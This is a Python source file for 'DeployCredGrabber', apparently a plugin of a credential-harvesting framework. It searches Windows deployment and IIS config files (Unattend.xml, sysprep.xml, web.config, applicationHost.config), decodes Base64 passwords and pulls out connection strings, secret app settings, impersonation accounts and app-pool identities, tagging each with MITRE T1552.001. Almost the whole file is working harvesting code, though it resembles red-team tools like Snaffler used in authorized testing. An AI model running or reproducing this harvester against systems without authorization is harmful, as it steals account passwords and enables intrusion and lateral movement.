"""
DeployCredGrabber -- Extract credentials from deployment/config files

Targets:
- Unattend.xml / autounattend.xml / sysprep.xml (Windows deployment)
  Passwords are Base64-encoded in <Password><Value> elements
- web.config (IIS) -- connection strings with plaintext passwords
- applicationHost.config (IIS) -- app pool identities with passwords

These are some of the most commonly found credentials on Windows servers.
Snaffler and Seatbelt both check for these -- essential coverage.

MITRE ATT&CK: T1552.001 (Credentials In Files)
"""

from __future__ import annotations

import base64
import os
import re
import xml.etree.ElementTree as ET

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text

# Locations where unattend/sysprep files are commonly found
_UNATTEND_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\unattend.xml",
    r"C:\Windows\Panther\Autounattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\System32\sysprep\sysprep.xml",
    r"C:\Windows\System32\sysprep\Panther\Unattend.xml",
    r"C:\unattend.xml",
    r"C:\autounattend.xml",
]

# IIS config paths
_IIS_PATHS = [
    r"C:\inetpub\wwwroot\web.config",
    r"C:\Windows\System32\inetsrv\config\applicationHost.config",
]


def _extract_unattend_passwords(file_path: str, content: str) -> list[dict]:
    """Parse unattend/sysprep XML for Base64-encoded passwords."""
    results = []
    try:
        root = ET.fromstring(content)
    except ET.ParseError:
        return results

    # Search all elements for Password/Value pairs
    for elem in root.iter():
        tag = elem.tag.split("}")[-1] if "}" in elem.tag else elem.tag

        if tag.endswith("Password") or tag == "Password":
            value_elem = None
            for child in elem:
                child_tag = child.tag.split("}")[-1] if "}" in child.tag else child.tag
                if child_tag == "Value" and child.text:
                    value_elem = child.text.strip()
                    break

            if value_elem:
                try:
                    decoded = base64.b64decode(value_elem).decode("utf-16-le", errors="ignore").rstrip("\x00")
                except Exception:
                    decoded = ""

                # Find associated username
                parent = elem
                username = ""
                for sibling in root.iter():
                    s_tag = sibling.tag.split("}")[-1] if "}" in sibling.tag else sibling.tag
                    if s_tag in ("Username", "Name") and sibling.text:
                        username = sibling.text.strip()

                results.append({
                    "file": file_path,
                    "username": username,
                    "password_b64": value_elem,
                    "password_decoded": decoded,
                    "context": "Unattend/Sysprep deployment password",
                })

        # AutoLogon section
        if tag == "AutoLogon":
            username = ""
            password = ""
            domain = ""
            for child in elem.iter():
                child_tag = child.tag.split("}")[-1] if "}" in child.tag else child.tag
                if child_tag == "Username" and child.text:
                    username = child.text.strip()
                elif child_tag == "Domain" and child.text:
                    domain = child.text.strip()
                elif child_tag == "Value" and child.text:
                    try:
                        password = base64.b64decode(child.text.strip()).decode("utf-16-le", errors="ignore").rstrip("\x00")
                    except Exception:
                        password = child.text.strip()

            if username:
                full_user = f"{domain}\\{username}" if domain else username
                results.append({
                    "file": file_path,
                    "username": full_user,
                    "password_b64": "",
                    "password_decoded": password,
                    "context": "AutoLogon credentials",
                })

    return results


def _extract_webconfig_creds(file_path: str, content: str) -> list[dict]:
    """Extract connection strings and credentials from web.config."""
    results = []

    # Connection strings with passwords
    conn_pattern = re.compile(
        r'connectionString\s*=\s*"([^"]*(?:password|pwd)\s*=\s*[^";]+[^"]*)"',
        re.IGNORECASE,
    )
    for match in conn_pattern.finditer(content):
        conn_str = match.group(1)
        # Extract password from connection string
        pw_match = re.search(r'(?:password|pwd)\s*=\s*([^;"\s]+)', conn_str, re.IGNORECASE)
        user_match = re.search(r'(?:user\s*id|uid|username)\s*=\s*([^;"\s]+)', conn_str, re.IGNORECASE)
        results.append({
            "file": file_path,
            "username": user_match.group(1) if user_match else "",
            "password_b64": "",
            "password_decoded": pw_match.group(1) if pw_match else "",
            "context": f"web.config connectionString: {conn_str[:100]}",
        })

    # AppSettings with credential-like keys
    key_pattern = re.compile(
        r'<add\s+key\s*=\s*"([^"]*(?:password|secret|key|token)[^"]*)"\s+value\s*=\s*"([^"]*)"',
        re.IGNORECASE,
    )
    for match in key_pattern.finditer(content):
        key_name = match.group(1)
        value = match.group(2)
        if value and len(value) > 3:
            results.append({
                "file": file_path,
                "username": key_name,
                "password_b64": "",
                "password_decoded": value,
                "context": f"web.config appSetting: {key_name}",
            })

    # Identity impersonation with password
    identity_pattern = re.compile(
        r'<identity\s+impersonate\s*=\s*"true"\s+userName\s*=\s*"([^"]*)"\s+password\s*=\s*"([^"]*)"',
        re.IGNORECASE,
    )
    for match in identity_pattern.finditer(content):
        results.append({
            "file": file_path,
            "username": match.group(1),
            "password_b64": "",
            "password_decoded": match.group(2),
            "context": "web.config identity impersonation",
        })

    return results


def _extract_apphost_creds(file_path: str, content: str) -> list[dict]:
    """Extract app pool identities from applicationHost.config."""
    results = []

    # Application pool process model with specific user
    pool_pattern = re.compile(
        r'<processModel\s[^>]*userName\s*=\s*"([^"]+)"[^>]*password\s*=\s*"([^"]*)"',
        re.IGNORECASE,
    )
    for match in pool_pattern.finditer(content):
        results.append({
            "file": file_path,
            "username": match.group(1),
            "password_b64": "",
            "password_decoded": match.group(2),
            "context": "applicationHost.config app pool identity",
        })

    return results


class DeployCredGrabber(GrabberModule):
    name = "deploy_cred"
    description = "Extract credentials from Unattend.xml, web.config, IIS applicationHost.config"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    def preflight_check(self, context: GrabberContext) -> bool:
        # Check standard paths
        for path in _UNATTEND_PATHS + _IIS_PATHS:
            if os.path.isfile(path):
                return True
        # Also check scan targets for these files
        for target in context.scan_context.target_paths:
            if os.path.isdir(target):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Check standard unattend paths
        for path in _UNATTEND_PATHS:
            self._process_unattend(path, result)

        # Check IIS configs
        for path in _IIS_PATHS:
            self._process_iis(path, result)

        # Also search scan targets for these files
        target_filenames = {
            "unattend.xml", "autounattend.xml", "sysprep.xml",
            "web.config", "applicationhost.config",
        }
        for target_dir in context.scan_context.target_paths:
            if not os.path.isdir(target_dir):
                continue
            try:
                for root, dirs, files in os.walk(target_dir):
                    for fname in files:
                        if fname.lower() in target_filenames:
                            fpath = os.path.join(root, fname)
                            if fname.lower() in ("unattend.xml", "autounattend.xml", "sysprep.xml"):
                                self._process_unattend(fpath, result)
                            elif fname.lower() == "web.config":
                                self._process_iis(fpath, result)
                            elif fname.lower() == "applicationhost.config":
                                self._process_iis(fpath, result)
                    # Don't recurse too deep
                    if root.count(os.sep) - target_dir.count(os.sep) > 5:
                        dirs.clear()
            except (PermissionError, OSError):
                continue

        result.status = GrabberStatus.COMPLETED
        return result

    def _process_unattend(self, path: str, result: GrabberResult) -> None:
        content = safe_read_text(path)
        if not content:
            return

        entries = _extract_unattend_passwords(path, content)
        for entry in entries:
            score = 200 if entry["password_decoded"] else 100
            result.credentials.append(ExtractedCredential(
                source_module=self.name,
                credential_type="password",
                target_application="Windows Deployment",
                username=entry["username"],
                decrypted_value=entry["password_decoded"],
                encrypted_value=entry["password_b64"].encode() if entry["password_b64"] else b"",
                notes=entry["context"],
                mitre_technique="T1552.001",
                source_file=path,
            ))
            if entry["password_decoded"]:
                result.findings.append(self.make_finding(
                    file_path=path,
                    description=f"Deployment password decoded: {entry['username']}",
                    score=score,
                    matched_value=entry["username"],
                ))

        # Even without creds, flag the file
        if not entries and content:
            result.findings.append(self.make_finding(
                file_path=path,
                description="Unattend/Sysprep file found (no passwords extracted)",
                score=60,
                matched_value="unattend.xml",
            ))

    def _process_iis(self, path: str, result: GrabberResult) -> None:
        content = safe_read_text(path)
        if not content:
            return

        if "web.config" in path.lower():
            entries = _extract_webconfig_creds(path, content)
        else:
            entries = _extract_apphost_creds(path, content)

        for entry in entries:
            result.credentials.append(ExtractedCredential(
                source_module=self.name,
                credential_type="password",
                target_application="IIS Configuration",
                username=entry["username"],
                decrypted_value=entry["password_decoded"],
                notes=entry["context"],
                mitre_technique="T1552.001",
                source_file=path,
            ))
            result.findings.append(self.make_finding(
                file_path=path,
                description=f"IIS credential: {entry['username']}",
                score=175,
                matched_value=entry["username"],
            ))
